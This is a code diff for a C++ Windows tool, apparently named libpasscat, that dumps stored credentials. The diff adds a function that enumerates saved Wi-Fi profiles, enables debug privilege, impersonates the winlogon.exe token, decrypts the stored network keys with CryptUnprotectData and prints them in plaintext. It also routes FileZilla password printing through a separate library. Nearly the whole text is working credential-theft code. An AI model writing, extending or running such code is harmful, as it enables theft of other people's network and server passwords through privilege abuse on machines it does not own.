@@ -22,29 +22,195 @@
 
 //For more see the file 'LICENSE' for copying permission.
 
+#include <iostream>
+
 #include "libpasscat.h"
+#include "libfilezilla.h"
 #include "libxml.h"
-#include "libsystem.h"
 #include "config.h"
+#include "libpriv.h"
+#include "libsystem.h"
 
-#pragma comment (lib, "Shlwapi.lib")
-#include <Shlwapi.h>
+#define WLAN_API_VER	2
 
-void libpasscat::cat_filezilla_passwords(void) {
+#pragma comment(lib, "wlanapi.lib")
+#include <Wlanapi.h>
 
-	std::wstring filezilla_path = libsystem::get_filezilla_path();
-	std::wstring filezilla_recent_servers = filezilla_path + L"\\" + FILEZILLA_FILE_ONE;
-	std::wstring filezilla_site_manager = filezilla_path + L"\\" + FILEZILLA_FILE_TWO;
+#pragma comment (lib, "Crypt32.lib")
+#include <Wincrypt.h>
 
+bool libpasscat::initialized = false;
+
+void libpasscat::init(void) {
 	libxml::init();
+	initialized = true;
+}
 
-	if (PathFileExistsW(filezilla_recent_servers.c_str())) {
-		libxml::select_by_xpath(filezilla_recent_servers, FILEZILLA_XPATH_ONE);
-	}
-
-	if (PathFileExistsW(filezilla_site_manager.c_str())) {
-		libxml::select_by_xpath(filezilla_site_manager, FILEZILLA_XPATH_TWO);
-	}
+void libpasscat::finalize(void) {
+	if (!initialized) return;
 
 	libxml::finalize();
+	initialized = false;
+}
+
+void libpasscat::cat_filezilla_passwords(void) {
+	if (!initialized) return;
+
+	libfilezilla::print_filezilla_passwords();
+}
+
+void libpasscat::cat_wifi_passwords(void) {
+	if (!initialized) return;
+
+	DWORD SupportedVersion = 0;
+	HANDLE wlan = NULL;
+	PWLAN_INTERFACE_INFO_LIST wlanifaceslist = NULL;
+	PWLAN_PROFILE_INFO_LIST wlanproflist = NULL;
+	PWLAN_INTERFACE_INFO pIfInfo = NULL;
+	DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
+	DWORD access = 0;
+	LPWSTR profileXML;
+
+	BYTE toKey[1024] = { 0 };
+	DWORD toKeySize = 1024;
+	DWORD dwSkip = 0;
+	DATA_BLOB DataIn;
+	DATA_BLOB DataOut;
+	DWORD procID = 0;
+
+	HANDLE procToken = NULL;
+	HANDLE procHandleToken = NULL;
+
+	if (WlanOpenHandle(WLAN_API_VER, NULL, &SupportedVersion, &wlan) != ERROR_SUCCESS) {
+		return;
+	}
+
+	if (WlanEnumInterfaces(wlan, NULL, &wlanifaceslist) != ERROR_SUCCESS) {
+		if (wlan) {
+			WlanCloseHandle(wlan, NULL);
+			wlan = NULL;
+		}
+		return;
+	}
+
+	if (wlanifaceslist->dwNumberOfItems == 0) {
+		if (wlan) {
+			WlanCloseHandle(wlan, NULL);
+			wlan = NULL;
+		}
+		if (wlanifaceslist) {
+			WlanFreeMemory(wlanifaceslist);
+			wlanifaceslist = NULL;
+		}
+		return;
+	}
+
+	for (DWORD i = 0; i < (int)wlanifaceslist->dwNumberOfItems; i++) {
+		pIfInfo = (WLAN_INTERFACE_INFO *)&wlanifaceslist->InterfaceInfo[i];
+
+		if (WlanGetProfileList(wlan, &pIfInfo->InterfaceGuid, NULL, &wlanproflist) != ERROR_SUCCESS) {
+			continue;
+		}
+
+		for (DWORD j = 0; j < wlanproflist->dwNumberOfItems; j++) {
+			std::wcout << "WLAN Profile Name: " << wlanproflist->ProfileInfo[j].strProfileName << std::endl;
+
+			if (WlanGetProfile(wlan, &pIfInfo->InterfaceGuid, wlanproflist->ProfileInfo[j].strProfileName, NULL, &profileXML, &flags, &access) == ERROR_SUCCESS) {
+
+				MSXML::IXMLDOMNodeListPtr list = libxml::select_by_path(profileXML, WIFI_XPATH_ONE);
+				std::wcout << "Authentication: " << list->item[0]->selectSingleNode("pf:authentication")->text << std::endl;
+				std::wcout << "Encryption: " << list->item[0]->selectSingleNode("pf:encryption")->text << std::endl;
+				std::wcout << "useOneX: " << list->item[0]->selectSingleNode("pf:useOneX")->text << std::endl;
+
+				if (wcscmp(list->item[0]->selectSingleNode("pf:useOneX")->text, L"false") == 0 && wcscmp(list->item[0]->selectSingleNode("pf:authentication")->text, L"open") != 0)
+				{
+					list = libxml::select_by_path(profileXML, WIFI_XPATH_TWO);
+					//std::wcout << "Key Type: " << list->item[0]->selectSingleNode("pf:keyType")->text << std::endl;
+					//if (wcscmp(list->item[0]->selectSingleNode("pf:protected")->text, L"true") == 0) {
+
+					LPWSTR text = _bstr_t(list->item[0]->selectSingleNode("pf:keyMaterial")->text);
+
+					if ((procID = libsystem::GetProcessIdByProcessName(L"winlogon.exe")) == 0) {
+						continue;
+					}
+
+					if (!libpriv::SetCurrentPrivilege(SE_DEBUG_NAME, TRUE)) {
+						std::cout << "Password: " << "<encrypted>" << std::endl << std::endl;
+						continue;
+					}
+
+					if (!(procToken = OpenProcess(MAXIMUM_ALLOWED, FALSE, procID))) {
+						continue;
+					}
+
+					if (!OpenProcessToken(procToken, MAXIMUM_ALLOWED, &procHandleToken)) {
+						if (procToken) {
+							CloseHandle(procToken);
+							procToken = NULL;
+						}
+						continue;
+					}
+
+					if (!ImpersonateLoggedOnUser(procHandleToken)) {
+						if (procHandleToken) {
+							CloseHandle(procHandleToken);
+							procHandleToken = NULL;
+						}
+						if (procToken) {
+							CloseHandle(procToken);
+							procToken = NULL;
+						}
+						continue;
+					}
+
+					if (libpriv::IsElevated()) {
+						if (!CryptStringToBinaryW(text, (DWORD)wcslen(text), CRYPT_STRING_HEX, NULL, &toKeySize, NULL, NULL)) {
+							std::cout << "Password: " << "<encrypted>" << std::endl;
+							continue;
+						}
+
+						if (CryptStringToBinaryW(text, (DWORD)wcslen(text), CRYPT_STRING_HEX, toKey, &toKeySize, NULL, NULL)) {
+							DataIn.cbData = toKeySize;
+							DataIn.pbData = (BYTE *)toKey;
+							if (CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
+								std::cout << "Password: " << DataOut.pbData << std::endl;
+							}
+						}
+						else {
+							std::cout << GetLastError() << std::endl;
+						}
+					}
+					else {
+						std::cout << "Password: " << "<encrypted>" << std::endl;
+					}
+					//}
+				}
+			}//WlanGetProfile
+
+			std::wcout << std::endl;
+			if (procToken) {
+				CloseHandle(procToken);
+				procToken = NULL;
+			}
+			if (procHandleToken) {
+				CloseHandle(procHandleToken);
+				procHandleToken = NULL;
+			}
+		}
+
+		if (wlanproflist) {
+			WlanFreeMemory(wlanproflist);
+			wlanproflist = NULL;
+		}
+	}
+
+	if (wlanifaceslist) {
+		WlanFreeMemory(wlanifaceslist);
+		wlanifaceslist = NULL;
+	}
+
+	if (wlan) {
+		WlanCloseHandle(wlan, NULL);
+		wlan = NULL;
+	}
 }
